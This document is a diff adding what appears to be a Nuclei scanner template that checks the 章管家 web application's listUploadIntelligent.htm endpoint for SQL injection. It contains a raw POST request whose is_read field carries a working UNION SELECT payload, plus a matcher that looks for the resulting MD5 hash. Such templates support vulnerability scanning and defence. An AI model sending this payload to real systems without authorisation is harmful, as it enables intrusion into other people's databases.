@@ -1,0 +1,27 @@
+id: zhangguanjia-listUploadIntelligent-sql
+
+info:
+  name: 章管家 listUploadIntelligent.htm SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /app/message/listUploadIntelligent.htm?token=dingtalk_token HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Content-Type: application/x-www-form-urlencoded
+
+        person_id=1&unit_id=1&pageNo=1&is_read=-1 union select MD5(123456),2,3,4,5,6,7,8,9,10,11,12 --
+
+    matchers:
+      - type: dsl
+        name: SQL注入
+        dsl:
+          - "status_code==200 && contains_all(body,'e10adc3949ba59abbe56e057f20f883e')"
